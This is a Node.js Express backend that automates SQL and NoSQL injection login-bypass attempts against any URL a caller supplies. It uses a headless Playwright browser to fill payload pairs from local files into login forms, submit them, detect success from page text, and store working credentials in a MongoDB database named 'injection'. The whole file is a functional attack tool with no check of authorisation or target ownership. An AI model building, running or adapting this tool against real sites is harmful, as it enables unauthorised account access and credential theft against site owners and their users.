const express = require('express');
const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');
const cors = require('cors'); // Import cors
require('dotenv').config(); // Load environment variables from .env file
const { MongoClient } = require('mongodb'); // Import MongoClient

const app = express();
const PORT = 3000;

// MongoDB Connection
const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri);

async function connectToMongoDB() {
    try {
        await client.connect();
        console.log("Connected to MongoDB!");
    } catch (e) {
        console.error("Could not connect to MongoDB", e);
    }
}

connectToMongoDB();

app.use(express.json());
app.use(cors()); // Use cors middleware
app.use(express.static(__dirname));

app.post('/scan', async (req, res) => {
    const { url, type, email } = req.body;

    if (!url || !type) {
        return res.status(400).json({ error: 'URL and type are required.' });
    }

    // Ensure the URL has a protocol
    let targetUrl = url;
    if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
        targetUrl = `http://${targetUrl}`;
    }

    const payloadsPath = path.join(__dirname, type === 'sql' ? 'bypass' : 'nosqlbypass');
    let payloads;
    try {
        const data = fs.readFileSync(payloadsPath, 'utf8');
        const lines = data.split('\n').map(line => line.trim()).filter(line => line !== '' && !line.startsWith('//'));
        
        payloads = [];
        for (let i = 0; i < lines.length; i += 2) {
            if (lines[i].startsWith('Username:') && lines[i+1].startsWith('Password:')) {
                const username = lines[i].substring('Username:'.length).trim();
                const password = lines[i+1].substring('Password:'.length).trim();
                payloads.push(`${username}::${password}`);
            }
        }
    } catch (error) {
        console.error(`Error reading payloads file: ${error.message}`);
        return res.status(500).json({ error: 'Failed to read payloads file.' });
    }

    let browser;
    try {
        browser = await chromium.launch({ headless: true }); // Launch in headless mode for deployment
        const page = await browser.newPage();
        console.log(`Navigating to ${targetUrl}`);
        await page.goto(targetUrl, { timeout: 90000, waitUntil: 'domcontentloaded' }); // Increased timeout to 90 seconds
        console.log(`Navigated to ${page.url()}`);
        await page.waitForSelector('input[name="username"], input[name="email"], input[name="phone"]', { timeout: 60000 }); // Wait for username/email field to be visible

        // Attempt to click a login button if it exists, to handle multi-step logins
        const loginButtonSelectors = [
            'button:has-text("Login")',
            'button:has-text("Sign In")',
            'a:has-text("Login")',
            'a:has-text("Sign In")',
            'input[type="submit"][value="Login"]',
            'input[type="submit"][value="Sign In"]',
            '#loginButton', // Common ID
            '#signInButton'  // Common ID
        ];

        let loginButtonClicked = false;
        for (const selector of loginButtonSelectors) {
            try {
                const button = await page.locator(selector).first();
                if (await button.isVisible()) {
                    console.log(`Clicking login button with selector: ${selector}`);
                    await button.click();
                    await page.waitForLoadState('networkidle'); // Wait for navigation after click
                    loginButtonClicked = true;
                    break; // Exit loop after clicking the first visible button
                }
            } catch (e) {
                console.log(`Login button selector "${selector}" not found or not visible.`);
                // Selector not found or not visible, continue to next
            }
        }
        if (!loginButtonClicked) {
            console.log('No specific login button was clicked, proceeding with form filling.');
        }

        const results = [];

        for (const payload of payloads) {
            const [usernamePayload, passwordPayload] = payload.split('::');
            if (!usernamePayload || !passwordPayload) {
                console.warn(`Skipping malformed payload: ${payload}`);
                continue;
            }

            const finalUsername = email && email.trim() !== '' ? email.trim() : usernamePayload.trim();

            // Wait for the username and password input fields to be visible
            console.log('Waiting for username field...');
            await page.waitForSelector('input[name="username"], input[name="email"], input[name="phone"]', { timeout: 60000 });
            console.log('Username field found.');
            
            // Log current URL and page content before waiting for password field
            console.log(`Current URL before password field check: ${page.url()}`);
            // console.log(`Page content before password field check (truncated to 500 chars): ${await page.content().then(c => c.substring(0, 500))}`);

            try {
                console.log(`Filling username with: ${finalUsername}`);
                    console.log(`Attempting to fill username field with: ${finalUsername}`);
                    await page.fill('input[name="username"], input[name="Username"], input[name="email"], input[name="Email"], input[name="phone"]', finalUsername, { timeout: 60000 });
                    console.log('Username field filled.');
                    await page.waitForLoadState('networkidle'); // Wait for page to settle after filling username
                    console.log(`Current URL after filling username: ${page.url()}`);
                    const screenshotPathUsername = `screenshot_after_username_${Date.now()}.png`;
                    await page.screenshot({ path: screenshotPathUsername }); // Take a screenshot for debugging
                    setTimeout(() => {
                        fs.unlink(screenshotPathUsername, (err) => {
                            if (err) console.error(`Error deleting screenshot ${screenshotPathUsername}:`, err);
                            else console.log(`Deleted screenshot: ${screenshotPathUsername}`);
                        });
                    }, 1000); // Delete after 1 second

                    // Attempt to find password field on the same page first
                    const passwordFieldSelector = 'input[name="password"], input[name="Password"]';
                    let passwordField = await page.locator(passwordFieldSelector).first();

                    if (await passwordField.isVisible()) {
                        console.log('Password field found on the same page. Filling password.');
                        console.log(`Attempting to fill password field with: ${passwordPayload}`);
                    await passwordField.fill(passwordPayload.trim(), { timeout: 60000 });
                    console.log('Password field filled.');
                    // Skip next button logic and proceed to submit
                } else {
                    console.log('Password field not found on the same page. Waiting for 3 seconds and re-checking.');
                    await page.waitForTimeout(3000); // Wait for dynamic content to load
                    passwordField = await page.locator(passwordFieldSelector).first(); // Re-check for password field

                    if (await passwordField.isVisible()) {
                        console.log('Password field found after waiting. Filling password.');
                        await passwordField.fill(passwordPayload.trim(), { timeout: 60000 });
                        console.log('Password field filled.');
                    } else {
                        console.log('Password field still not found. Proceeding with "Log In" button logic.');

                        const loginButtonSelectors = [
                            'button:has-text(/Log In/i)', // Case-insensitive "Log In"
                            'button[type="submit"]:has-text(/Log In/i)',
                            'div[role="button"]:has-text(/Log In/i)',
                            'button[type="submit"]', // Generic submit button
                            'button[role="button"]', // Generic button role
                        ];

                        let loginButtonClicked = false;
                        for (const selector of loginButtonSelectors) {
                            try {
                                const button = await page.locator(selector).first();
                                if (await button.isVisible() && !button.isDisabled()) {
                                    console.log(`Clicking "Log In" button with selector: ${selector}`);
                                    await button.click();
                                    await page.waitForLoadState('networkidle'); // Wait for navigation after click
                                    loginButtonClicked = true;
                                    break;
                                }
                            } catch (e) {
                                console.log(`"Log In" button selector "${selector}" not found, not visible, or disabled.`);
                            }
                        }

                        if (loginButtonClicked) {
                            console.log('"Log In" button clicked, waiting for password field on the new page or dynamically loaded.');
                            await page.waitForSelector(passwordFieldSelector, { timeout: 60000 });
                            console.log('Password field found after "Log In" button click.');
                            await page.fill(passwordFieldSelector, passwordPayload.trim(), { timeout: 60000 });
                            console.log('Password field filled.');
                        } else {
                            console.log('No specific "Log In" button was clicked, proceeding to find password field on the current page (fallback).');
                            await page.waitForSelector(passwordFieldSelector, { timeout: 60000 });
                            console.log('Password field found (fallback).');
                            await page.fill(passwordFieldSelector, passwordPayload.trim(), { timeout: 60000 });
                            console.log('Password field filled (fallback).');
                        }
                    }
                }
            } catch (fillError) {
                console.error(`Error filling username/password field for payload ${payload}: ${fillError.message}`);
                results.push({ payload: { username: finalUsername, password: passwordPayload.trim() }, success: false, error: `Fill error: ${fillError.message}` });
                await page.goto(targetUrl); // Go back to the login page for the next payload
                continue;
            }

            // Make submit button selection more flexible
            const submitButtonSelectors = [
                'button[type="submit"]',
                'input[type="submit"]',
                'button:has-text("Submit")',
                'button:has-text("Login")',
                'button:has-text("Sign In")',
                'input[value="Submit"]',
                'input[value="Login"]',
                'input[value="Sign In"]',
                '#submitButton',
                '#loginButton'
            ];

            let submitButtonClicked = false;
            console.log('Attempting to click submit button...');
            for (const selector of submitButtonSelectors) {
                try {
                    const button = await page.locator(selector).first();
                    if (await button.isVisible()) {
                        console.log(`Clicking submit button with selector: ${selector}`);
                        await button.click();
                        submitButtonClicked = true;
                        break;
                    }
                } catch (e) {
                    console.log(`Submit button selector "${selector}" not found or not visible.`);
                    // Selector not found or not visible, continue to next
                }
            }

            if (!submitButtonClicked) {
                console.error(`Could not find a clickable submit button for payload: ${payload}`);
                results.push({ payload: { username: finalUsername, password: passwordPayload.trim() }, success: false, error: 'No clickable submit button found.' });
                await page.goto(targetUrl, { timeout: 60000, waitUntil: 'domcontentloaded' }); // Go back to the login page for the next payload
                continue;
            }
            console.log('Submit button clicked.');
            // await page.waitForLoadState('networkidle'); // Wait for page to settle after submission
            await Promise.race([
                page.waitForNavigation({ waitUntil: 'networkidle' }).catch(() => {}), // Wait for navigation or timeout
                page.waitForSelector('body').catch(() => {}) // Wait for body to be present or timeout
            ]);
            const screenshotPathSubmission = `screenshot_after_submission_${Date.now()}.png`;
            await page.screenshot({ path: screenshotPathSubmission }); // Take a screenshot for debugging
            setTimeout(() => {
                fs.unlink(screenshotPathSubmission, (err) => {
                    if (err) console.error(`Error deleting screenshot ${screenshotPathSubmission}:`, err);
                    else console.log(`Deleted screenshot: ${screenshotPathSubmission}`);
                });
            }, 1000); // Delete after 1 second
            // const pageContent = await page.content(); // Declare and assign pageContent here
            // fs.writeFileSync(`page_content_after_submission_${Date.now()}.html`, pageContent);

            const currentUrl = page.url();
            const pageContent = await page.content(); // Re-fetch page content after potential navigation

            let success = false;
            let successfulLogin = null; // Initialize a variable to store the first successful login

            // Define common failure message selectors
            const failureMessageSelectors = [
                'text=Invalid credentials',
                'text=Incorrect username or password',
                'text=Login failed',
                'text=Authentication failed',
                'text=Access denied',
                'text=Wrong username or password',
                'div.error-message', // Common class for error messages
                'span.error',        // Another common class for error messages
                '#login-error',      // Common ID for login error messages
                '#message.error'     // Another common ID for error messages
            ];

            let failureMessageFound = false;
            for (const selector of failureMessageSelectors) {
                try {
                    const locator = page.locator(selector);
                    if (await locator.isVisible()) {
                        console.log(`Login failed: Found failure message with selector: "${selector}"`);
                        failureMessageFound = true;
                        break;
                    }
                } catch (e) {
                    // Selector not found, continue to next
                }
            }

            if (failureMessageFound) {
                success = false; // Explicitly set to false if a failure message is found
                console.log('Login failed due to explicit failure message.');
            } else {
                // Check for common indicators of a successful login only if no failure message was found
                const myAccountLinkPresent = await page.locator('#flyout a:has-text("My Account")').isVisible();
                const welcomeMessagePresent = await page.locator('text=Welcome,').isVisible();

                if (myAccountLinkPresent || welcomeMessagePresent) {
                    success = true;
                    successfulLogin = { username: finalUsername, password: passwordPayload.trim() }; // Store successful credentials
                    console.log('Login successful: "My Account" link or "Welcome" message found.');

                    // Store successful login in MongoDB
                    try {
                        const database = client.db("injection"); // Specify your database name
                        const collection = database.collection("successfulLogins");
                        await collection.insertOne(successfulLogin);
                        console.log("Successful login stored in MongoDB:", successfulLogin);
                    } catch (dbError) {
                        console.error("Error storing successful login in MongoDB:", dbError);
                    }
                } else {
                    console.log('Login failed: No clear success indicators found (e.g., "My Account" link or "Welcome" message).');
                }
            }
            results.push({ payload: { username: usernamePayload.trim(), password: passwordPayload.trim() }, success });
            await page.goto(targetUrl, { timeout: 60000, waitUntil: 'domcontentloaded' }); // Go back to the login page for the next payload
        }

        console.log('Scan complete. Results:', results);
        console.log('Sending scan results to frontend.');
        res.json({ message: 'Scan complete', results, successfulLogin }); // Include successfulLogin in the response
    } catch (error) {
        console.error('Error during scan:', error);
        res.status(500).json({ message: 'Error during scan', error: error.message });
    } finally {
        if (browser) {
            await browser.close();
            console.log('Playwright browser closed.');
        }
    }
});

app.listen(PORT, () => {
    console.log(`Backend server listening at http://localhost:${PORT}`);
});